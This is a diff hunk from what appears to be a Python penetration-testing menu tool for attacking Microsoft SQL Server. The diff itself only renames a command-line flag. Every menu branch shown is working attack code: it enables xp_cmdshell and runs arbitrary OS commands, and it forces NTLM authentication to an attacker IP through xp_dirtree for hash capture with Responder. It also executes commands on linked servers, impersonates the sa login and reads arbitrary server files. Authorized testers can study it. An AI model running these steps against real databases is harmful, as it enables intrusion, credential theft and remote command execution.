@@ -34,31 +34,31 @@ def run():
             "SELECT srvname,isremote FROM sysservers;",
             "SELECT IS_SRVROLEMEMBER('sysadmin');",
         ]:
-            run_cmd(f'{base} -query "{q}"')
+            run_cmd(f'{base} -command "{q}"')
 
     elif c == "2":
-        run_cmd(f"{base} -query \"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\"")
+        run_cmd(f"{base} -command \"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\"")
         cmd = prompt("OS command to run")
-        run_cmd(f'{base} -query "EXEC xp_cmdshell \'{cmd}\';"')
+        run_cmd(f'{base} -command "EXEC xp_cmdshell \'{cmd}\';"')
         add_finding("xp_cmdshell Enabled", "Critical",
                     f"OS command execution on {target}", "Disable xp_cmdshell; least-privilege MSSQL account")
 
     elif c == "3":
         lhost = prompt("Attacker IP (Responder running)")
-        run_cmd(f'{base} -query "EXEC xp_dirtree \'\\\\\\\\{lhost}\\\\share\';"')
+        run_cmd(f'{base} -command "EXEC xp_dirtree \'\\\\\\\\{lhost}\\\\share\';"')
         info("Capture NTLM hash with: sudo responder -I eth0 -rdw")
 
     elif c == "4":
         linked = prompt("Linked server name")
         cmd    = prompt("Command to run")
-        run_cmd(f'{base} -query "EXEC (\'EXEC xp_cmdshell \\\'{cmd}\\\'\') AT [{linked}];"')
+        run_cmd(f'{base} -command "EXEC (\'EXEC xp_cmdshell \\\'{cmd}\\\'\') AT [{linked}];"')
 
     elif c == "5":
-        run_cmd(f'{base} -query "EXECUTE AS LOGIN = \'sa\'; SELECT IS_SRVROLEMEMBER(\'sysadmin\');"')
+        run_cmd(f'{base} -command "EXECUTE AS LOGIN = \'sa\'; SELECT IS_SRVROLEMEMBER(\'sysadmin\');"')
 
     elif c == "6":
         fpath = prompt("File path (e.g. C:\\\\Windows\\\\win.ini)")
-        run_cmd(f'{base} -query "SELECT * FROM OPENROWSET(BULK N\'{fpath}\', SINGLE_CLOB) AS C;"')
+        run_cmd(f'{base} -command "SELECT * FROM OPENROWSET(BULK N\'{fpath}\', SINGLE_CLOB) AS C;"')
 
     elif c == "7":
         instance = prompt("MSSQL instance (e.g. dbserver31.tech.finance.corp)")
